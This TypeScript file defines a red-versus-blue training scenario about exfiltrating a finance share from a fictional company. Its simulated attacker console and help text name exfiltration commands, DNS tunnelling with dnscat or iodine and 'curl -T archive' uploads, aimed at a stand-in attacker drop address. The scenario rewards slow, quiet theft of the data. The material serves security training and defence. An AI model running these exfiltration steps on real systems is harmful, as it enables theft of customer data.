/**
 * Operation Tidewater, phase four: exfiltration from Northwind Logistics.
 *
 * WHERE THIS PICKS UP
 *
 * Red is on the file server (10.10.5.20). The objective is to get the sensitive
 * data off the estate. This scenario is the theft and the way out.
 *
 * THE SKILL EACH SIDE IS LEARNING
 *
 * Red is learning that exfiltration is a chain, and that the channel is the whole
 * game. You cannot send what you have not collected and staged, and once you have
 * the archive, a slow trickle over DNS blends into ordinary lookups while a bulk
 * upload lights up every egress graph on the estate. So the scoring rewards
 * collecting first and then leaving QUIETLY, and marks down the fast, loud way
 * even though the data still leaves.
 *
 * Blue is learning that exfiltration is caught at collection and at the egress
 * edge, not after the fact. The tools are hunting the DLP and file-access logs,
 * watching egress, blocking a destination, and quarantining the share before it
 * is staged. Blocking egress after a slow channel has already drained is the
 * timing lesson this rehearses.
 *
 * Northwind is fabricated. Internal hosts use RFC 1918 ranges; anything external
 * uses RFC 5737 documentation ranges.
 */

import type { MatchSide, MatchSignal, MatchState, RevealedFinding } from '@soc/shared';

import { MatchError, type MoveResolution } from '../../services/matchEngine.js';
import { registerMatchScenario } from '../../services/matchContent.js';
import type { AttackerConsole, MoveOption, RedBlueScenario, TargetDossier } from './types.js';

const SCENARIO_ID = 'rt-exfil-northwind';
const MAX_TURNS = 5;
const MAX_OBJECTIVE = 10;
const MAX_JUDGE = 10;

const DOSSIER: TargetDossier = {
  org: 'Northwind Logistics',
  summary:
    'Access to the internal file server obtained. Objective: get the sensitive data off the ' +
    'estate. The prize is the finance share; the risk is the way out. Authorised assessment.',
  facts: [
    { k: 'Position', v: '10.10.5.20 (file server, as svc-backup)' },
    { k: 'Target data', v: '\\\\fileserver\\finance (customer PII, financials)' },
    { k: 'Egress', v: 'Outbound via the edge appliance' },
    { k: 'Controls', v: 'DLP on the share; netflow at the edge' },
    { k: 'External drop', v: '198.51.100.24 (attacker-controlled)' },
  ],
};

const RED_OPTIONS: MoveOption[] = [
  { id: 'wait', label: 'Hold and blend', description: 'No action. Sit on the access and look like the service account.' },
  { id: 'locate-data', label: 'Locate the data', description: 'Find the sensitive files on the share. Light file access.' },
  { id: 'stage-data', label: 'Stage the data', description: 'Collect and compress into one archive. A large, unusual write.' },
  { id: 'exfil-dns', label: 'Exfil over DNS', description: 'Trickle the archive out in DNS queries. Slow, and quiet, if it is staged.' },
  { id: 'exfil-bulk', label: 'Bulk upload', description: 'Push the archive to an external host in one go. Fast, and loud.' },
];

const BLUE_OPTIONS: MoveOption[] = [
  { id: 'monitor', label: 'Hold and monitor', description: 'No action. Keep watching DLP and egress.' },
  { id: 'hunt-dlp', label: 'Hunt file access', description: 'Read the DLP and file-access logs on the share.' },
  { id: 'watch-egress', label: 'Watch egress', description: 'Investigate outbound netflow for anomalies.' },
  { id: 'quarantine-share', label: 'Quarantine the share', description: 'Restrict access to the finance share. Stops collection.' },
  { id: 'block-egress', label: 'Block egress', description: 'Cut the external destination at the edge. Stops the transfer.' },
];

/** True once Red has staged an archive to send. */
function hasStaged(state: MatchState): boolean {
  return state.moves.some((m) => m.side === 'red' && m.optionId === 'stage-data');
}

type RedThreat = 'quiet' | 'collect' | 'exfil-quiet' | 'exfil-loud';

function stagedBefore(state: MatchState, index: number): boolean {
  return state.moves.slice(0, index).some((m) => m.side === 'red' && m.optionId === 'stage-data');
}

function redThreat(state: MatchState): RedThreat {
  for (let i = state.moves.length - 1; i >= 0; i -= 1) {
    const m = state.moves[i];
    if (!m || m.side !== 'red') continue;
    switch (m.optionId) {
      case 'locate-data':
      case 'stage-data':
        return 'collect';
      case 'exfil-dns':
        return stagedBefore(state, i) ? 'exfil-quiet' : 'collect';
      case 'exfil-bulk':
        return stagedBefore(state, i) ? 'exfil-loud' : 'collect';
      default:
        return 'quiet';
    }
  }
  return 'quiet';
}

function judge(text: string): number {
  const t = text.toLowerCase();
  const words = t.split(/\s+/).filter(Boolean);
  const terms = [
    'quiet', 'loud', 'noise', 'detect', 'dlp', 'egress', 'exfil', 'stage', 'collect', 'archive',
    'dns', 'blend', 'bulk', 'block', 'quarantine', 'channel', 'before', 'first', 'chain', 'slow',
  ];
  let pts = words.length >= 6 ? 4 : words.length >= 3 ? 2 : 0;
  pts += Math.min(6, terms.filter((k) => t.includes(k)).length * 3);
  return Math.min(MAX_JUDGE, pts);
}

function score(
  objectivePoints: number,
  note: string,
  signal: MatchSignal | null,
  justification: string,
  reveals?: RevealedFinding[],
  hostLog?: string[],
): MoveResolution {
  return {
    score: { objectivePoints, maxObjective: MAX_OBJECTIVE, judgePoints: judge(justification), maxJudge: MAX_JUDGE, note },
    signal,
    reveals,
    hostLog,
  };
}

function resolveRed(state: MatchState, optionId: string, justification: string): MoveResolution {
  const staged = hasStaged(state);
  switch (optionId) {
    case 'wait':
      return score(5, 'Still, and unremarkable. Nothing given away.', null, justification);
    case 'locate-data':
      return score(
        6,
        'You have to find it before you can take it. Reading the share is light, but DLP still sees who touched what.',
        { detected: true, label: 'Sensitive file access', detail: 'The service account browsed the finance share.' },
        justification,
        [{ id: 'finance-share', kind: 'service', title: 'Finance share located', detail: '\\\\fileserver\\finance holds customer PII and financials.', severity: 'low' }],
        ['Sep 04 13:20:09 edr fileserver: dlp file-access svc-backup -> \\\\fileserver\\finance (browse)'],
      );
    case 'stage-data':
      return score(
        6,
        'One archive is tidy to send and loud to make. A large compress of files the service account never bundles is exactly what collection looks like.',
        { detected: true, label: 'Bulk file collection', detail: 'A large archive was written from the finance share.' },
        justification,
        [{ id: 'staged', kind: 'vuln', title: 'Data staged', detail: 'A 4 GB archive of the finance share is written to disk, ready to send.', severity: 'high' }],
        ['Sep 04 13:26:33 edr fileserver: 4663 mass read (2,140 files) then write customers.7z (4.1 GB)'],
      );
    case 'exfil-dns':
      if (!staged) {
        return score(
          1,
          'Nothing to send. You have collected nothing, so there is no archive to trickle out.',
          { detected: true, label: 'Odd DNS pattern', detail: 'A short burst of unusual lookups with nothing behind it.' },
          justification,
          [{ id: 'exfil-failed', kind: 'service', title: 'Exfil failed', detail: 'No staged data; the channel carried nothing.', severity: 'info' }],
          ['Sep 04 13:28:00 edge dns: unusual TXT lookups from 10.10.5.20 (brief)'],
        );
      }
      return score(
        10,
        'Out, and slow enough to look like ordinary lookups. A low, patient DNS channel is the quiet way, and it is the whole point.',
        { detected: true, label: 'Elevated DNS volume', detail: 'A sustained trickle of DNS queries. Easy to miss.' },
        justification,
        [{ id: 'exfil-done-dns', kind: 'vuln', title: 'Exfil complete over DNS', detail: 'The archive left slowly over DNS. Low profile, hard to spot in the noise.', severity: 'high' }],
        ['Sep 04 13:30:11 edge dns: sustained TXT lookups from 10.10.5.20 to *.a1b2.example (low rate)'],
      );
    case 'exfil-bulk':
      if (!staged) {
        return score(
          1,
          'You have staged nothing. A bulk upload of an archive that does not exist is a loud connection carrying air.',
          { detected: true, label: 'Outbound connection', detail: 'A connection to an external host that transferred almost nothing.' },
          justification,
          [{ id: 'exfil-failed', kind: 'service', title: 'Exfil failed', detail: 'No staged data; the upload carried nothing.', severity: 'info' }],
          ['Sep 04 13:29:40 edge netflow: 10.10.5.20 -> 198.51.100.24 (0.2 MB)'],
        );
      }
      return score(
        6,
        'Off the estate, and you announced it. Four gigabytes to one external host in one go is the clearest egress spike a netflow graph ever draws. It works, and it is the loud way.',
        { detected: true, label: 'Large outbound transfer', detail: 'A multi-gigabyte upload to a single external address.' },
        justification,
        [{ id: 'exfil-done-bulk', kind: 'vuln', title: 'Exfil complete via bulk upload', detail: 'The archive left in one transfer to 198.51.100.24. Fast, and a glaring egress spike.', severity: 'high' }],
        ['Sep 04 13:31:02 edge netflow: 10.10.5.20 -> 198.51.100.24 (4.1 GB in 90s)'],
      );
    default:
      throw new MatchError('That is not a red move in this scenario.');
  }
}

function blueEvidence(threat: RedThreat): RevealedFinding[] {
  switch (threat) {
    case 'collect':
      return [{ id: 'ev-collect', kind: 'evidence', title: 'Mass file read and archive', detail: 'The service account read thousands of files then wrote a 4 GB archive. It never does that.', severity: 'high' }];
    case 'exfil-quiet':
      return [{ id: 'ev-dns', kind: 'evidence', title: 'DNS volume from a file server', detail: 'A steady stream of odd TXT lookups from 10.10.5.20. Quiet, but a file server should not be doing this.', severity: 'medium' }];
    case 'exfil-loud':
      return [{ id: 'ev-egress', kind: 'evidence', title: 'Gigabytes to one external host', detail: 'A 4 GB outbound transfer from an internal file server to 198.51.100.24. Unmistakable.', severity: 'high' }];
    default:
      return [];
  }
}

function resolveBlue(state: MatchState, optionId: string, justification: string): MoveResolution {
  const threat = redThreat(state);
  const blocked: MatchSignal = { detected: true, label: 'Egress blocked', detail: 'The external destination stopped responding.' };
  const quarantined: MatchSignal = { detected: true, label: 'Share restricted', detail: 'Access to the finance share was locked down.' };
  const exfil = threat === 'exfil-quiet' || threat === 'exfil-loud';

  switch (optionId) {
    case 'monitor':
      if (threat === 'quiet') return score(8, 'Nothing to act on. Holding was right.', null, justification);
      if (threat === 'collect') return score(4, 'Collection was underway and you watched. It moved on.', null, justification);
      return score(exfil ? 1 : 3, 'The data was leaving and you sat on it. That is the miss that matters most.', null, justification);
    case 'hunt-dlp':
      if (threat === 'quiet') return score(5, 'Little to find, but reading the DLP log is never wasted.', null, justification, blueEvidence(threat));
      return score(9, 'You pulled the file-access log and saw the collection for what it was.', null, justification, blueEvidence(threat));
    case 'watch-egress':
      if (exfil) return score(9, 'You watched the egress and caught the channel carrying the data out.', null, justification, blueEvidence(threat));
      if (threat === 'collect') return score(7, 'Watching egress with an archive staged is the right place to be looking.', null, justification, blueEvidence(threat));
      return score(4, 'Nothing is leaving yet, but egress is a fine thing to watch.', null, justification);
    case 'quarantine-share':
      if (threat === 'collect') return score(9, 'They are collecting. Locking the share down now stops the archive being finished or read again.', quarantined, justification);
      if (exfil) return score(5, 'Quarantining helps going forward, but this archive is already made and moving.', quarantined, justification);
      return score(threat === 'quiet' ? 3 : 5, 'Locking a share nothing has touched yet is an outage with no cause.', quarantined, justification);
    case 'block-egress':
      if (exfil) return score(10, 'The data is on the wire. Cutting the destination is the call, and every second counts.', blocked, justification);
      if (threat === 'collect') return score(6, 'Blocking the likely destination pre-empts the send. Reasonable once an archive exists.', blocked, justification);
      return score(2, 'Blocking an egress nothing is using is a change with cost and no cause yet.', blocked, justification);
    default:
      throw new MatchError('That is not a blue move in this scenario.');
  }
}

const resolve = ({
  state,
  side,
  optionId,
  justification,
}: {
  state: MatchState;
  side: MatchSide;
  optionId: string;
  justification: string;
}): MoveResolution =>
  side === 'red' ? resolveRed(state, optionId, justification) : resolveBlue(state, optionId, justification);

const HELP = [
  'Exfil console. Position: 10.10.5.20. Drop: 198.51.100.24. Tools:',
  '  find //fileserver/finance   locate the sensitive data      (light)',
  '  tar / 7z <files>            stage into one archive          (loud collection)',
  '  dnscat / iodine             trickle the archive out by DNS  (quiet, needs staging)',
  '  curl -T archive <host>      bulk upload the archive         (loud, needs staging)',
  '  wait                        hold and blend',
  'Each real action is your move for the turn. Say why before you run it.',
  '',
].join('\n');

function attackerRun(command: string): { output: string; optionId: string | null } {
  const cmd = command.trim();
  const tool = (cmd.split(/\s+/)[0] ?? '').toLowerCase();
  const lower = cmd.toLowerCase();
  if (tool === 'help' || tool === '?') return { output: HELP, optionId: null };
  if (tool === 'wait' || tool === 'sleep') return { output: 'Holding. Looking like the service account.\n', optionId: 'wait' };
  if (tool === 'find' || tool === 'ls' || tool === 'dir' || tool === 'grep') {
    return { output: '\\\\fileserver\\finance\\customers.csv\n\\\\fileserver\\finance\\ledger-2026.xlsx\n... 2,140 files\n', optionId: 'locate-data' };
  }
  if (tool === 'tar' || tool === '7z' || tool === 'zip' || tool === 'rar') {
    return { output: 'Creating archive customers.7z ... 4.1 GB written\n', optionId: 'stage-data' };
  }
  if (tool === 'dnscat' || tool === 'dnscat2' || tool === 'iodine') {
    return { output: 'Opening DNS channel to *.a1b2.example ... trickling 4.1 GB (low rate)\n', optionId: 'exfil-dns' };
  }
  if (tool === 'curl' || tool === 'wget' || tool === 'scp' || tool === 'rclone' || lower.includes('-t ') || lower.includes('--upload-file')) {
    return { output: 'Uploading customers.7z to 198.51.100.24 ... 4.1 GB sent in 90s\n', optionId: 'exfil-bulk' };
  }
  return { output: `${tool || 'that'}: not a tool on this console. Type help.\n`, optionId: null };
}

const ATTACKER_CONSOLE: AttackerConsole = {
  banner: [
    'Exfil console attached. Position: 10.10.5.20. Drop: 198.51.100.24.',
    'Type help for tools. Every real action is your move for the turn.',
  ],
  run: attackerRun,
};

export const EXFIL_NORTHWIND: RedBlueScenario = {
  id: SCENARIO_ID,
  title: 'Operation Tidewater: Exfiltration',
  brief:
    'Access to the finance share, and a way out to find. Red locates the data, stages it, and ' +
    'chooses a channel; Blue watches collection and the egress edge and decides how to cut it. Red ' +
    'wins by collecting first and leaving quietly; Blue wins by catching it at the share or the wire.',
  maxTurns: MAX_TURNS,
  dossier: DOSSIER,
  red: RED_OPTIONS,
  blue: BLUE_OPTIONS,
  resolve,
  attacker: ATTACKER_CONSOLE,
};

registerMatchScenario(EXFIL_NORTHWIND.id, EXFIL_NORTHWIND.resolve, { maxTurns: EXFIL_NORTHWIND.maxTurns });
